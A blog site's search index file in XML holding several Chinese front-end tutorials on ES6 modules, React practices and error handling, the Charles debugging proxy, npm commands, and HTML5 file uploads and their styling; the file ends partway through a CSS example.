<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ES6中的import和export]]></title>
    <url>%2F2017%2F11%2F03%2FES6%E4%B8%AD%E7%9A%84import%E5%92%8Cexport%2F</url>
    <content type="text"><![CDATA[简要介绍：ES6在语言规格的层面上，实现了模块功能，而且实现得相当简单，完全可以取代现有的CommonJS和AMD规范，成为浏览器和服务器通用的模块解决方案。ES6模块主要有两个功能：export和importexport用于对外输出本模块（一个文件可以理解为一个模块）变量的接口import用于在一个模块中加载另一个含有export接口的模块。1.以对象属性形式的export和import（1）一般的形式123//export.jsexport let x=1;export let y=2;12import&#123;x,y&#125; from "./export.js"console.log(x,y)//输出x=1,y=2（2）函数名的形式123//export.jsexport function x()&#123;&#125;12import &#123;x&#125; from "./export.js";console.log(x)//输出的为x函数也就是说：12345export function x()&#123;&#125;//等价于==export let x=function()&#123;&#125;（3）import as1234567//export.jsexport let x=1;export let y=2;//import.jsimport * as myVar from "./export.js"console.log(myVar.x)//输出为1console.log(myVar.y)//输出为22.以模板形式的export和import12//export.jsexport default let x=1;12import x from "./export.js";console.log(x) //输出的是x可以发现，通过export模板的话，输出的格式不是以对象的形式{x}，而是直接的x。]]></content>
      <categories>
        <category>ECMAScript6</category>
      </categories>
      <tags>
        <tag>ES6</tag>
        <tag>import</tag>
        <tag>export</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些年踩过的React之坑]]></title>
    <url>%2F2017%2F11%2F03%2F%E9%82%A3%E4%BA%9B%E5%B9%B4%E8%B8%A9%E8%BF%87%E7%9A%84React%E4%B9%8B%E5%9D%91%2F</url>
    <content type="text"><![CDATA[前言对很多 react 新手来说，网上能找到的资源大都是些简单的 tutorial ，它们能教会你如何使用 react ，但并不会告诉你怎么在实际项目中优雅的组织和编写 react 代码。用谷歌搜中文“ React 最佳实践”发现前两页几乎全都是同一篇国外文章的译文…所以我总结了下自己过去那个项目使用 React 踩过的一些坑，也整理了一些别人的观点，希望对部分 react 使用者有帮助。React 与 AJAXReact只负责处理View这一层，它本身不涉及网络请求/AJAX，所以这里我们需求考虑两个问题：第一，用什么技术从服务端获取数据；第二，获取到的数据应该放在react组件的什么位置。React官方提供了一种解决方案：Load Initial Data via AJAX使用jQuery的Ajax方法，在一个组件的componentDidMount()中发ajax请求，拿到的数据存在组件自己的state中，并调用setState方法去更新UI。如果是异步获取数据，则在componentWillUnmount中取消发送请求。如果只是为了使用jQuery的Ajax方法就引入整个jQuery库，既是一种浪费又加大了整个应用的体积。那我们还有什么其他的选择吗？事实上是有很多的：fetch()、fetch polyfill、axios…其中最需要我们关注的是window.fetch(),它是一个简洁、标准化的javascript的Ajax API。在Chrome和Firefox中已经可以使用，如果需要兼容其他浏览器，可以使用fetch polyfill。React官方文档只告诉了我们在一个单一组件中如何通过ajax从服务器端获取数据，但并没有告诉我们在一个完整的实际项目中到底应该把数据存在哪些组件中，这部分如果缺乏规范的话，会导致整个项目变得混乱、难以维护。下面给出三种比较好的实践：1. 所有的数据请求和管理都存放在唯一的一个根组件让父组件/根组件集中发送所有的ajax请求，把从服务端获取的数据统一存放在这个组件的state中，再通过props把数据传给子组件。这种方法主要是针对组件树不是很复杂的小型应用。缺点就是当组件树的层级变多了以后，需要把数据一层一层地传给子组件，写起来麻烦，性能也不好。2. 设置多个容器组件专门处理数据请求和管理其实跟第一种方法类似，只不过设置多个容器组件来负责数据请求和状态管理。这里我们需要区分两种不同类型的组件，一种是展示性组件（presentational component），另一种是容器性组件（container component）。展示性组件本身不拥有任何状态，所有的数据都从容器组件中获得，在容器组件中发送ajax请求。一个具体的例子：假设我们需要展示用户的姓名和头像，首先创建一个展示性组件&lt;UserProfile /&gt;,它接受两个Props：name和profileImage。这个组件内部没有任何关于Ajax的代码。然后创建一个容器组件&lt;UserProfileContainer /&gt;，它接受一个userId的参数，发送Ajax请求从服务器获取数据存在state中，再通过props传给 &lt;UserProfile /&gt; 组件。3. 使用Redux或Relay的情况Redux管理状态和数据，Ajax从服务器端获取数据，所以很显然当我们使用了Redux时，应该把所有的网络请求都交给redux来解决。具体来说，应该是放在Async Actions。如果用其他类Flux库的话，解决方式都差不多，都是在actions中发送网络请求。Relay是Facebook官方推出的一个库。如果用它的话，我们只需要通过GraphQL来声明组件需要的数据，Relay会自动地把下载数据并通过props往下传递。不过想要用Relay，你得先有一个GraphQL的服务器…一个标准组件的组织结构123456781 class definition 1.1 constructor 1.1.1 event handlers 1.2 'component' lifecycle events 1.3 getters 1.4 render2 defaultProps3 proptypes使用 PropTypes 和 getDefaultProps()1、一定要写PropTypes，切莫为了省事而不写2、如果一个Props不是requied，一定在getDefaultProps中设置它React.PropTypes主要用来验证组件接收到的props是否为正确的数据类型，如果不正确，console中就会出现对应的warning。出于性能方面的考虑，这个API只在开发环境下使用。基本使用方法12345678910propTypes: &#123; myArray: React.PropTypes.array, myBool: React.PropTypes.bool, myFunc: React.PropTypes.func, myNumber: React.PropTypes.number, myString: React.PropTypes.string， // You can chain any of the above with `isRequired` to make sure a warning // is shown if the prop isn't provided. requiredFunc: React.PropTypes.func.isRequired&#125;假如我们props不是以上类型，而是拥有复杂结构的对象怎么办？比如下面这个：1234&#123; text: 'hello world', numbers: [5, 2, 7, 9],&#125;当然，我们可以直接用React.PropTypes.object,但是对象内部的数据我们却无法验证。123propTypes: &#123; myObject: React.PropTypes.object,&#125;进阶使用方法：shape() 和 arrayOf()123456propTypes: &#123; myObject: React.PropTypes.shape(&#123; text: React.PropTypes.string, numbers: React.PropTypes.arrayOf(React.PropTypes.number), &#125;)&#125;下面是一个更复杂的Props：12345678910111213141516[ &#123; name: 'Zachary He', age: 13, married: true, &#125;, &#123; name: 'Alice Yo', name: 17, &#125;, &#123; name: 'Jonyu Me', age: 20, married: false, &#125;]综合上面，写起来应该就不难了：123456789propTypes: &#123; myArray: React.PropTypes.arrayOf( React.propTypes.shape(&#123; name: React.propTypes.string.isRequired, age: React.propTypes.number.isRequired, married: React.propTypes.bool &#125;) )&#125;把计算和条件判断都交给 render() 方法1. 组件的state中不能出现props1234567891011121314// BAD: constructor (props) &#123; this.state = &#123; fullName: `$&#123;props.firstName&#125; $&#123;props.lastName&#125;` &#125;; &#125; render () &#123; var fullName = this.state.fullName; return ( &lt;div&gt; &lt;h2&gt;&#123;fullName&#125;&lt;/h2&gt; &lt;/div&gt; ); &#125;1234// GOOD:render () &#123; var fullName = `$&#123;this.props.firstName&#125; $&#123;this.props.lastName&#125;`;&#125;当然，复杂的display logic也应该避免全堆放在render()中，因为那样可能导致整个render()方法变得臃肿，不优雅。我们可以把一些复杂的逻辑通过helper function移出去。1234567// GOOD: helper functionrenderFullName () &#123; return `$&#123;this.props.firstName&#125; $&#123;this.props.lastName&#125;`;&#125;render () &#123; var fullName = this.renderFullName();&#125;2. 保持state的简洁，不要出现计算得来的state1234567891011121314// WRONG: constructor (props) &#123; this.state = &#123; listItems: [1, 2, 3, 4, 5, 6], itemsNum: this.state.listItems.length &#125;; &#125; render() &#123; return ( &lt;div&gt; &lt;span&gt;&#123;this.state.itemsNum&#125;&lt;/span&gt; &lt;/div&gt; ) &#125;1234// Right:render () &#123; var itemsNum = this.state.listItems.length;&#125;3. 能用三元判断符，就不用If，直接放在render()里1234567891011// BAD:renderSmilingStatement () &#123; if (this.state.isSmiling) &#123; return &lt;span&gt;is smiling&lt;/span&gt;; &#125;else &#123; return ''; &#125;&#125;,render () &#123; return &lt;div&gt;&#123;this.props.name&#125;&#123;this.renderSmilingStatement()&#125;&lt;/div&gt;;&#125;123456789101112// GOOD:render () &#123; return ( &lt;div&gt; &#123;this.props.name&#125; &#123;(this.state.smiling) ? &lt;span&gt;is smiling&lt;/span&gt; : null &#125; &lt;/div&gt; );&#125;4. 布尔值都不能搞定的，交给IIFE吧123456789101112131415161718return ( &lt;section&gt; &lt;h1&gt;Color&lt;/h1&gt; &lt;h3&gt;Name&lt;/h3&gt; &lt;p&gt;&#123;this.state.color || "white"&#125;&lt;/p&gt; &lt;h3&gt;Hex&lt;/h3&gt; &lt;p&gt; &#123;(() =&gt; &#123; switch (this.state.color) &#123; case "red": return "#FF0000"; case "green": return "#00FF00"; case "blue": return "#0000FF"; default: return "#FFFFFF"; &#125; &#125;)()&#125; &lt;/p&gt; &lt;/section&gt;);5. 不要把display logic写在componentWillReceiveProps或componentWillMount中，把它们都移到render()中去。如何动态处理 classNames1. 使用布尔值12345678910111213141516// BAD:constructor () &#123; this.state = &#123; classes: [] &#125;; &#125; handleClick () &#123; var classes = this.state.classes; var index = classes.indexOf('active'); if (index != -1) &#123; classes.splice(index, 1); &#125; else &#123; classes.push('active'); &#125; this.setState(&#123; classes: classes &#125;); &#125;123456789// GOOD: constructor () &#123; this.state = &#123; isActive: false &#125;; &#125; handleClick () &#123; this.setState(&#123; isActive: !this.state.isActive &#125;); &#125;2. 使用classnames这个小工具来拼接classNames：123456789// BEFORE:var Button = React.createClass(&#123; render () &#123; var btnClass = 'btn'; if (this.state.isPressed) btnClass += ' btn-pressed'; else if (this.state.isHovered) btnClass += ' btn-over'; return &lt;button className=&#123;btnClass&#125;&gt;&#123;this.props.label&#125;&lt;/button&gt;; &#125;&#125;);123456789101112// AFTER：var classNames = require('classnames');var Button = React.createClass(&#123; render () &#123; var btnClass = classNames(&#123; 'btn': true, 'btn-pressed': this.state.isPressed, 'btn-over': !this.state.isPressed &amp;&amp; this.state.isHovered &#125;); return &lt;button className=&#123;btnClass&#125;&gt;&#123;this.props.label&#125;&lt;/button&gt;; &#125;&#125;);]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>reactjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Charles使用详解]]></title>
    <url>%2F2017%2F11%2F02%2FCharles%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[一、开始连接方式方法一：电脑和手机连接同一个wifi方法二：电脑使用网线连接网络，手机通过USB连接电脑二、过滤网络请求1.简单过滤在Sequence模式下，就可以看到Filter，输入要过滤的关键字即可。2.长期特定的网络封包路径：Proxy-&gt;Recording Settings-&gt;Include→Add在编辑框中填入要封的网络请求3.关注特定的网络请求在想要特定关注的网络请求那行，右键勾选”Focus”即可三、抓取手机网络包前提：手机，电脑连结的是通一个wifi网络在菜单栏上选择 Proxy-&gt;Proxy Settings，填入代理端口 8888，并勾上 “Enable transparent HTTP proxying” 即完成了代理查看电脑IP地址在手机wifi网络中添加代理，输入电脑IP和charles的端口号 8888抓HTTPS包1.Mac安装SSL证书在Help→SSL Proxying→Install….选择后，就会出现证书下载，下载成功后会电脑”钥匙串访问“中看见(这里我已经安装并信任过了)，然后双击下载的证书，勾选信任即可。2.手机安装SSL证书在SSL Proxying中勾选Install …Mobile Device 会弹出一个框，用手机(处于代理状态下)登陆指定的url下载证书即可。这时候你抓https的时候还是发现不行，乱码加unknown（如下图）这时候我们还需要一步操作，就是将想要抓的https加入到SSL代理中，这样才能被Charles识别并解析选择我们要抓的请求，右键选择”Enable SSL Proxying”这时我们发现不再乱码和unknown了四、网络限速开发中常备限速，通常对于Chrome我们可以使用浏览器中的”Network中Online修改”，下拉还有3G等设置。但是通过代理我们可以做的更全更多在”Proxy→Throttle Settings”中，我们可以给所有的网络限速，也可以通过勾选”Only for selected hosts”限制指定的请求速度五、修改网络请求内容选中一条网络请求，然后右键选择”Compose”，就会出现上图下半部分的框，可以修改几乎任何你可以想到的请求参数，点击”Execute”执行即可六、修改服务器返回的内容1.Map Remote(Tools→Map Remote Settings)将网络响应定向至另外一个网络服务，从而达到修改返回内容的目的2.Map Local(Tools-&gt;Map Local Settings)将网络响应定向至本地文件，从而达到修改返回内容的目的3.Breakpoints替换返回内容（右键-&gt;Breakpoints）通过名称也可以看的出来，这个类似于一种断点的功能，代理会在发送请求的时候拦截并断点网络请求，这就为我们修改网络信息提供了便利。可以编辑请求的参数和返回的参数。七、反向代理反向代理(Proxy→Reverse Proxies Settings)也是一个常用的功能，特别是对于本地开发且需要域名的情况下这个截图的意思是 将本地 57689端口映射到www.os.com域名的80端口]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>Charles</tag>
        <tag>Charles使用详解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NPM常用命令]]></title>
    <url>%2F2017%2F11%2F01%2FNPM%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[npm是什么，大家都应该很熟悉了。npm的常用命令很多，为了避免经常到npm官网查找，特将常用的npm命令整理下来。npm install包安装模块本地安装npm install express 就会默认安装express的最新版本，也可以通过在后面加版本号的方式安装指定版本，如npm install express@3.0.5安装结束后，当前目录下回多出一个node_modules目录,里面有express模块简单说明一下上图express@3.0.5 当前安装的package为express，版本为3.0.5node_modules/express：安装目录methods@0.0.1: 依赖的模块有methods、fresh等以及各自的版本和依赖。全局安装npm install express -g 将包安装到全局环境中,可以直接在命令行里使用。npm uninstall卸载模块我们可以使用以下命令来卸载 Node.js 模块。1npm uninstall express卸载后，你可以到 /node_modules/ 目录下查看包是否还存在，或者使用以下命令查看：1npm lsnpm update更新模块1npm update express更新express模块如果想知道npm上是否已经更新，npm info express可以查看到express在npm上发布过哪些版本以及最新的版本，但是内容太多，让人眼花缭乱，使用npm dist-tags ls express直接列出react发布过哪些tagnpm outdated检查模块是否已经过时此命令会列出所有已经过时的包，可以及时进行包的更新npm ls查看安装的模块这个命令可以查看安装的模块及依赖npm init创建模块，package.json 文件是必不可少的。npm init 会引导创建一个package.json文件，包括名称、版本、作者这些信息等接下来我们可以使用以下命令在 npm 资源库中注册用户（使用邮箱注册）：1234npm adduserUsername: mcmohdPassword:Email: (this IS public) mcmohd@gmail.com接下来我们就用以下命令来发布模块：1npm publish如果以上的步骤都操作正确，就可以跟其他模块一样使用 npm 来安装。package.json说明12345678910111213141516&#123; "name": "test", "version": "0.0.1", "description": "this is a test", "main": "index.js", "dependencies": &#123; "connect": "^3.4.1", "express": "^3.0.5" &#125;, "devDependencies": &#123;&#125;, "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "author": "", "license": "ISC"&#125;name - 包名。version - 包的版本号。description - 包的描述。homepage - 包的官网 url 。author - 包的作者姓名。contributors - 包的其他贡献者姓名。dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。main - main 字段是一个模块ID，它是一个指向你程序的主要项目。就是说，如果你包的名字叫 express，然后用户安装它，然后require(“express”)。keywords - 关键字npm help查看某条命令的详细帮助例如npm help install，系统在默认的浏览器或者默认的编辑器中打开本地nodejs安装包的文件/nodejs/node_modules/npm/html/doc/cli/npm-install.htmlnpm root查看包的安装路径输出 node_modules的路径npm config管理npm的配置路径npm的配置工作主要是通过npm config命令，主要包含增、删、改、查几个步骤，下面就以最为常用的proxy配置为例。设置proxy内网使用npm设置代理，如下1npm config set proxy http://proxy.example.com:8080查看proxy1npm config get proxy删除proxy1npm config delete proxy查看所有配置1npm config list直接修改配置文件1npm config edit此时会在默认编辑器中打开配置文件，可以手动修改配置文件npm cache管理模块的缓存常用命令 清除npm本地缓存 npm cache cleannpm start启动模块基础语法1npm start [-- &lt; args &gt;]该命令写在package.json文件scripts的start字段中，可以自定义命令来配置一个服务器环境和安装一系列的必要程序，如“scripts”: { “start”: “gulp -ws” }此时在cmd中输入npm start命令相当于执行gulpfile.js文件自定义的watch和server命令。如果package.json文件没有设置start，则将直接启动node server.jsnpm test测试模块基础语法1npm test [--&lt; args &gt; ]该命令写在package.json文件scripts的test字段中，可以自定义该命令来执行一些操作，如“scripts”: { “test”: “gulp release” },此时在cmd中输入npm test命令相当于执行gulpfile.js文件自定义的release命令。npm version查看模块版本npm view查看模块的注册信息1npm view moduleNames：查看node模块的package.json文件注意事项：如果想要查看package.json文件夹下某个标签的内容，可以使用1npm view moduleName labelName]]></content>
      <categories>
        <category>ECMAScript6</category>
      </categories>
      <tags>
        <tag>npm常用命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何给React加try-catch]]></title>
    <url>%2F2017%2F11%2F01%2F%E5%A6%82%E4%BD%95%E7%BB%99React%E5%8A%A0try-catch%2F</url>
    <content type="text"><![CDATA[最近在一个使用fis构建的react.js项目里遇到个问题，render函数里如果发生了运行时错误，比如说某个对象没有判断就直接去访问其属性，那我所知道的就是，页面不正常了，特别是有嵌套子组件的时候，我可得一个个一层层去排查判断，去加try-catch。。。好像react的开发体验不应该是这样子的。通常来说，使用react的时候都配合以webpack构建，再加个webpack-dev-client，不仅有js live reload还能hot module reload，不离开编辑器的情况下就能一直调试下去。而且当出现运行时错误时，会有明确的error stack打印在页面上。为什么使用fis构建的就不行呢？先就自己遇到的这个问题来说，我通过多次手动try-catch的方式，找到了render失败的原因，那么这个“手动”的方式是不是可以自动？通常就是monkeypatch，在当前类定义之后，借助于js这种动态修改类定义的特性，可以这样子：12345678910111213var unsafeCreateClass = React.createClass;React.createClass = function(spec) &#123; var unsafeRender = spec['render']; spec['render'] = function() &#123; try &#123; return unsafeRender.apply(this, arguments); &#125; catch(e) &#123; console.log(e); &#125; &#125; return unsafeCreateClass.apply(this, arguments);&#125;S6的组件上是无效的，所以针对另一种写法可以这样子：12345678910111213141516171819class MyComponent extends React.Component &#123; render() &#123; return &lt;div&gt;render something here&lt;/div&gt;; &#125;&#125;function wrapTryCatch(Component) &#123; let oldRender = Component.prototype.render; Component.render = function() &#123; try &#123; oldRender.apply(this, arguments); &#125; catch(e) &#123; console.log(e); &#125; &#125; return Component;&#125;exports default wrapTryCatch(MyComponent);看起来大同小异，不过需要在每个Component的实现之后再wrap一下，包装出一个新的组件出来。而这种wrapper，借助于es7的新语法，decorator，(引入babel-plugin-transform-decorators)又可以这么写：123456@wrapTryCatchclass MyComponent extends React.Component &#123; render() &#123; return &lt;div&gt;render something here&lt;/div&gt;; &#125;&#125;然而，这还是不能让人满意的，毕竟遗留代码那么多，难道我要一个个去添加这种wrapper? 想想看，现在连decorator这种新语法都能通过babel插件来支持了，为什么不能再通过类似方法来把decorator都自动加进去呢？事实上，react-try-catch-render(也就是上个例子)这个文档是指出其由react-transform-catch-errors得到的启发，顺着这一点，最后是找到了babel-plugin-react-transform这个插件，刚好就能满足这个需求。而且，它本身已经内置在webpack-dev-client中，所以webpack构建的开发方式才会如此方便看到错误。按照给出的步骤，自行安装完依赖之后，在fis中对应的babel plugins配置部分添加：12345678"plugins": [ ["react-transform", &#123; "transforms": [&#123; "transform": "react-transform-catch-errors", "imports": ["react", "redbox-react"] &#125;] &#125;] ]配置选项中的imports传入了两个参数，这两个参数是react-transform会传给transform插件使用的，其中redbox-react 是一个自定义的错误处理组件，之前在webpack构建方式下的开发经常看到的红色框框原来就是它了！在实际使用中，可以按需替换，比如说实现badjs上报等。最后试了一下，在fis的构建方式下，也成功看到了红色框框，以后开发过程出现运行错误就页面不会安安静静地失败了。当然，到这里为止都只是在关心render函数的报错，其它阶段的回调，其实都是类似的实现。最后一种方式给了很大的启发和想象空间，现在借助于babel的帮助，我们可以在语法层面对js进行增强，在构建阶段就完成对功能的补充，这种方法现在看来，work like a charm!惹不住还是看了下babel transform插件是如何开发实现的，文档在此。babel作为一个源码转换编译器，是一个源码-&gt;ast-&gt;源码的过程，而transform插件所做的事就是在ast-&gt;源码的阶段。在对AST遍历的过程，按插件接口形式提供visitor，可以细致到对每个AST 节点进行修改(添加，删除，替换等)。所谓的visitor其实就是访问节点时候的钩子/回调。给visitor传入的参数path，给我一种一沙一宇宙的感觉，path提供的属性和操作就可以勾画出整个AST。]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>React</tag>
        <tag>react try catch</tag>
        <tag>给React加try-catch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React中什么时候使用箭头函数]]></title>
    <url>%2F2017%2F10%2F31%2FReact%E4%B8%AD%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BD%BF%E7%94%A8%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[当我们想起箭头函数时，脑海里可能会浮现 棒，酷，简洁，有趣等形容词，其实，我们存在一些 更充分的理由 使我们在联想起 箭头函数 时不得不想到的解决 this 引起的问题箭头函数不会在函数体内重新定义this 的值，这使得在回调中的行为更容易预测，并且避免了this在回调中潜存的bug下面我们来看一个example我们期望点击按钮，改变按钮颜色，代码如下123456789101112131415class BrokenButton extends React.Component &#123; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125; style=&#123;this.state&#125;&gt; Set background to red &lt;/button&gt; ); &#125; handleClick() &#123; this.setState(&#123; backgroundColor: "red" &#125;); &#125;&#125;render(&lt;BrokenButton /&gt;, document.getElementById("root"));然而，当我们点击按钮时，什么效果都没有，为什么会这样呢其实，不是handleClick方法没有起作用，因为JavaScript 中压根没有方法，JavaScript中只有函数，而函数中的this 存在一些规则，正是这些规则，让上面的handleClick中的this 值变成了null你需要清楚明白的是：你无法确定一个方法函数中this的指向，因为它的值跟函数的调用方式有关除非，你使用箭头函数，因为箭头函数中this的值是继承自 外围作用域1234567891011121314class Button extends React.Component &#123; render() &#123; return ( &lt;button onClick=&#123;() =&gt; this.setState(&#123; backgroundColor: "red" &#125;)&#125; style=&#123;this.state&#125; &gt; Set background to red &lt;/button&gt; ); &#125;&#125;render(&lt;Button /&gt;, document.getElementById("root"));现在就对了，接下来，我们继续浏览器支持浏览器对箭头函数的支持大概是73%，因为目前，IE 并不支持。但如果你已经意识到这一点，并且你还会代码转译，这对你来说就不算什么问题性能问题大家都发现了,箭头函数 书写起来是非常容易的，但书写忒多的函数，也会造成一些问题定义函数是昂贵的浏览器每执行一次 =&gt;，就需要创建一个新的函数对象，这其实是一个比较 昂贵 的操作当然，如果你不是想构建一个性能超级无敌宇宙螺旋棒 的组件，渲染一个非常长的列表或非常大的表格，你也不会发现这是一个问题所以，如果你的组件只是在页面中渲染个几次，你也没必要忒担心 性能这方面的问题两个相同的箭头函数并不相等为了让大家意识到这个问题，接下来，我们用==比较一下两个相同的箭头函数相不相等1234567891011121314const a = x =&gt; x, b = x =&gt; x;render( &lt;div&gt; &lt;h3&gt; Are &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; equal by &lt;code&gt;==&lt;/code&gt;? &lt;/h3&gt; &lt;p&gt; &#123;a == b ? "Yes!" : "No :("&#125; &lt;/p&gt; &lt;/div&gt;, document.getElementById("root"));如果你在 render 中使用箭头函数，那么你在每次调用render时都会去创建一个新的函数对象，此时，即使使用PureComponent和shouldComponentUpdate也起不到优化作用你可以在下面实例中看清这一点，其中，&lt;PropChangeCounter /&gt; 组件用于打印props改变的次数1234567891011121314151617181920212223242526import PropChangeCounter from "react-armory-prop-change-counter";class App extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; email: "" &#125;; &#125; render() &#123; return ( &lt;div&gt; &lt;input placeholder="Email" value=&#123;this.state.email&#125; onChange=&#123;e =&gt; this.setState(&#123; email: e.target.value &#125;)&#125; /&gt; &lt;PropChangeCounter constant=&#123;"this doesn't change"&#125; value=&#123;this.state.email&#125; onChange=&#123;e =&gt; this.setState(&#123; email: e.target.value &#125;)&#125; /&gt; &lt;/div&gt; ); &#125;&#125;render(&lt;App /&gt;, document.getElementById("root"));只定义一次如果你觉得性能对你的组件很重要，那么你肯定会想如果在组件中只定义箭头函数一次该有多好其中一种实现方式是在constructor中使用箭头函数，当然，对于复杂些的组价来说，这会变的很笨拙如果你使用了Babel或create-react-app构建你的应用，你可以将箭头函数设置为class fields或arrow function methods如下，你可以将handleClick重新定义为一个arrow function method，来修复第一个example中的bug123456789101112131415class Button extends React.Component &#123; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125; style=&#123;this.state&#125;&gt; Set background to red &lt;/button&gt; ); &#125; // Note: this syntax is not yet part of JavaScript proper, but is slated // for inclusion in the next version. It should already work with Babel. handleClick = () =&gt; &#123; this.setState(&#123; backgroundColor: "red" &#125;); &#125;;&#125;总结如果环境支持箭头函数，那么鼓励使用尽量避免对React组件 使用箭头函数，它会使调试变的困难如果有需要，可以在render中使用箭头函数为性能着想，避免在render中使用大量函数]]></content>
      <categories>
        <category>Reactjs</category>
      </categories>
      <tags>
        <tag>箭头函数</tag>
        <tag>React</tag>
        <tag>React中什么时候使用箭头函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5的input上传类型控制]]></title>
    <url>%2F2017%2F10%2F31%2FHTML5%E7%9A%84input%E4%B8%8A%E4%BC%A0%E7%B1%BB%E5%9E%8B%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[一、input:file属性属性值有以下几个比较常用：accept：表示可以选择的文件MIME类型，多个MIME类型用英文逗号分开，常用的MIME类型见下表。multiple：是否可以选择多个文件，多个文件时其value值为第一个文件的虚拟路径。1、accept只能选择png和gif图片1&lt;input id="fileId1" type="file" accept="image/png,image/gif" name="file" /&gt;2、multiple多文件上传1&lt;input id="fileId2" type="file" multiple="multiple" name="file" /&gt;3、常用MIME类型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849后缀名 MIME名称*.3gpp audio/3gpp, video/3gpp*.ac3 audio/ac3*.asf allpication/vnd.ms-asf*.au audio/basic*.css text/css*.csv text/csv*.doc application/msword *.dot application/msword *.dtd application/xml-dtd *.dwg image/vnd.dwg *.dxf image/vnd.dxf*.gif image/gif *.htm text/html *.html text/html *.jp2 image/jp2 *.jpe image/jpeg*.jpeg image/jpeg*.jpg image/jpeg *.js text/javascript, application/javascript *.json application/json *.mp2 audio/mpeg, video/mpeg *.mp3 audio/mpeg *.mp4 audio/mp4, video/mp4 *.mpeg video/mpeg *.mpg video/mpeg *.mpp application/vnd.ms-project *.ogg application/ogg, audio/ogg *.pdf application/pdf *.png image/png *.pot application/vnd.ms-powerpoint *.pps application/vnd.ms-powerpoint *.ppt application/vnd.ms-powerpoint *.rtf application/rtf, text/rtf *.svf image/vnd.svf *.tif image/tiff *.tiff image/tiff *.txt text/plain *.wdb application/vnd.ms-works *.wps application/vnd.ms-works *.xhtml application/xhtml+xml *.xlc application/vnd.ms-excel *.xlm application/vnd.ms-excel *.xls application/vnd.ms-excel *.xlt application/vnd.ms-excel *.xlw application/vnd.ms-excel *.xml text/xml, application/xml *.zip aplication/zip *.xlsx application/vnd.openxmlformats-officedocument.spreadsheetml.sheet二、AJAX上传文件在说到ajax上传文件。ajax上传的时候，需要获得input:file选择的文件（可能为多个文件），获取其文件列表为：123// input标签的files属性document.querySelector("#fileId").files// 返回的是一个文件列表数组获得的文件列表，然后遍历插入到表单数据当中。即：1234567891011121314// 获得上传文件DOM对象var oFiles = document.querySelector("#fileId");// 实例化一个表单数据对象var formData = new FormData();// 遍历图片文件列表，插入到表单数据中for (var i = 0, file; file = oFiles[i]; i++) &#123; // 文件名称，文件对象 formData.append(file.name, file);&#125;获得表单数据之后，就可以用ajax的POST上传。123456789// 实例化一个AJAX对象var xhr = new XMLHttpRequest();xhr.onload = function() &#123; alert("上传成功！");&#125;xhr.open("POST", "upload.php", true);// 发送表单数据xhr.send(formData);上传到服务器之后，获取到文件列表为：123456789101112131415161718192021Array( [jpg_jpg] =&gt; Array ( [name] =&gt; jpg.jpg [type] =&gt; image/jpeg [tmp_name] =&gt; D:\xampp\tmp\phpA595.tmp [error] =&gt; 0 [size] =&gt; 133363 ) [png_png] =&gt; Array ( [name] =&gt; png.png [type] =&gt; image/png [tmp_name] =&gt; D:\xampp\tmp\phpA5A6.tmp [error] =&gt; 0 [size] =&gt; 1214628 ))在服务端循环遍历这个数组就可以上传文件了。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>HTML5的input上传类型控制</tag>
        <tag>input[type=file]</tag>
        <tag>input上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[input[type=file]样式美化，input上传按钮美化]]></title>
    <url>%2F2017%2F10%2F31%2Finput%5Btype%3Dfile%5D%20%E6%A0%B7%E5%BC%8F%E7%BE%8E%E5%8C%96%EF%BC%8Cinput%E4%B8%8A%E4%BC%A0%E6%8C%89%E9%92%AE%E7%BE%8E%E5%8C%96%2F</url>
    <content type="text"><![CDATA[我们在做input文本上传的时候，html自带的上传按钮比较丑，如何对其进行美化呢？同理：input checkbox美化，input radio美化是一个道理的，后面文章会总结。思路：nput file上传按钮的美化思路是，先把之前的按钮透明度opacity设置为0,然后，外层用div包裹，就实现了美化功能。代码如下:DOM结构：1234567&lt;a href="javascript:;" class="a-upload"&gt; &lt;input type="file" name="" id=""&gt;点击这里上传文件&lt;/a&gt;&lt;a href="javascript:;" class="file"&gt;选择文件 &lt;input type="file" name="" id=""&gt;&lt;/a&gt;CSS样式1：12345678910111213141516171819202122232425262728293031323334/*a upload */.a-upload &#123; padding: 4px 10px; height: 20px; line-height: 20px; position: relative; cursor: pointer; color: #888; background: #fafafa; border: 1px solid #ddd; border-radius: 4px; overflow: hidden; display: inline-block; *display: inline; *zoom: 1&#125;.a-upload input &#123; position: absolute; font-size: 100px; right: 0; top: 0; opacity: 0; filter: alpha(opacity=0); cursor: pointer&#125;.a-upload:hover &#123; color: #444; background: #eee; border-color: #ccc; text-decoration: none&#125;样式2：1234567891011121314151617181920212223242526.file &#123; position: relative; display: inline-block; background: #D0EEFF; border: 1px solid #99D3F5; border-radius: 4px; padding: 4px 12px; overflow: hidden; color: #1E88C7; text-decoration: none; text-indent: 0; line-height: 20px;&#125;.file input &#123; position: absolute; font-size: 100px; right: 0; 